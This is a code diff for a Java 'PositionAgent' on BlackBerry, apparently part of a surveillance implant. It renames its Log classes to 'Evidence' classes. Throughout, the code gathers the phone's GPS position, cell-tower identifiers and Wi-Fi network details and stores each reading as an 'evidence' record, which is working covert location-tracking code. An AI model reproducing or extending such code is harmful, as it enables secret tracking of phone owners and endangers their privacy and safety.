@@ -30,10 +30,10 @@ import blackberry.Status;
 import blackberry.config.Conf;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
+import blackberry.evidence.Evidence;
+import blackberry.evidence.EvidenceType;
 import blackberry.location.LocationHelper;
 import blackberry.location.LocationObserver;
-import blackberry.log.Log;
-import blackberry.log.LogType;
 import blackberry.utils.Check;
 import blackberry.utils.DateTime;
 import blackberry.utils.Utils;
@@ -54,9 +54,9 @@ public final class PositionAgent extends Agent implements LocationObserver {
     private static final int LOG_TYPE_CDMA = 5;
     //private static final int TYPE_GPS_ASSISTED = 3;
 
-    Log logGps;
-    Log logCell;
-    Log logWifi;
+    Evidence logGps;
+    Evidence logCell;
+    Evidence logWifi;
 
     //#ifdef DEBUG
     static Debug debug = new Debug("PositionAgent", DebugLevel.VERBOSE);
@@ -101,9 +101,9 @@ public final class PositionAgent extends Agent implements LocationObserver {
         this(agentStatus);
         parse(confParams);
 
-        logWifi = log;
-        logGps = new Log(log);
-        logCell = new Log(log);
+        logWifi = evidence;
+        logGps = new Evidence(evidence);
+        logCell = new Evidence(evidence);
     }
 
     public void actualStart() {
@@ -230,9 +230,9 @@ public final class PositionAgent extends Agent implements LocationObserver {
             final byte[] payload = getWifiPayload(wifi.getBSSID(), wifi
                     .getSSID(), wifi.getSignalLevel());
 
-            logWifi.createLog(getAdditionalData(1, LOG_TYPE_WIFI),
-                    LogType.LOCATION_NEW);
-            logWifi.writeLog(payload);
+            logWifi.createEvidence(getAdditionalData(1, LOG_TYPE_WIFI),
+                    EvidenceType.LOCATION_NEW);
+            logWifi.writeEvidence(payload);
             logWifi.close();
         } else {
             //#ifdef DEBUG
@@ -277,9 +277,9 @@ public final class PositionAgent extends Agent implements LocationObserver {
             if (mcc != 0) {
                 final byte[] payload = getCellPayload(mcc, mnc, lac, cid, rssi);
 
-                logCell.createLog(getAdditionalData(0, LOG_TYPE_GSM),
-                        LogType.LOCATION_NEW);
-                saveLog(logCell, payload, LOG_TYPE_GSM);
+                logCell.createEvidence(getAdditionalData(0, LOG_TYPE_GSM),
+                        EvidenceType.LOCATION_NEW);
+                saveEvidence(logCell, payload, LOG_TYPE_GSM);
                 logCell.close();
             }
 
@@ -306,9 +306,9 @@ public final class PositionAgent extends Agent implements LocationObserver {
 
             if (sid != 0) {
                 final byte[] payload = getCellPayload(mcc, sid, nid, bid, rssi);
-                logCell.createLog(getAdditionalData(0, LOG_TYPE_CDMA),
-                        LogType.LOCATION_NEW);
-                saveLog(logCell, payload, LOG_TYPE_CDMA);
+                logCell.createEvidence(getAdditionalData(0, LOG_TYPE_CDMA),
+                        EvidenceType.LOCATION_NEW);
+                saveEvidence(logCell, payload, LOG_TYPE_CDMA);
                 logCell.close();
             }
         }
@@ -373,9 +373,9 @@ public final class PositionAgent extends Agent implements LocationObserver {
             //#endif
             final byte[] payload = getGPSPayload(qc, loc, timestamp);
 
-            logGps.createLog(getAdditionalData(0, LOG_TYPE_GPS),
-                    LogType.LOCATION_NEW);
-            saveLog(logGps, payload, TYPE_GPS);
+            logGps.createEvidence(getAdditionalData(0, LOG_TYPE_GPS),
+                    EvidenceType.LOCATION_NEW);
+            saveEvidence(logGps, payload, TYPE_GPS);
             logGps.close();
         }
 
@@ -401,14 +401,14 @@ public final class PositionAgent extends Agent implements LocationObserver {
         return additionalData;
     }
 
-    private void saveLog(Log acutalLog, byte[] payload, int type) {
+    private void saveEvidence(Evidence acutalEvidence, byte[] payload, int type) {
 
         //#ifdef DBC
-        Check.requires(payload != null, "saveLog payload!= null");
+        Check.requires(payload != null, "saveEvidence payload!= null");
         //#endif
 
         //#ifdef DEBUG
-        debug.trace("saveLog payload: " + payload.length);
+        debug.trace("saveEvidence payload: " + payload.length);
         //#endif
 
         final int version = 2008121901;
@@ -435,12 +435,12 @@ public final class PositionAgent extends Agent implements LocationObserver {
         databuffer.writeInt(delimiter);
 
         //#ifdef DBC
-        Check.ensures(databuffer.getPosition() == size, "saveLog wrong size");
+        Check.ensures(databuffer.getPosition() == size, "saveEvidence wrong size");
         //#endif
 
         // save log
         //log.createLog(null, LogType.LOCATION);
-        acutalLog.writeLog(message);
+        acutalEvidence.writeEvidence(message);
         //log.close();
     }
 
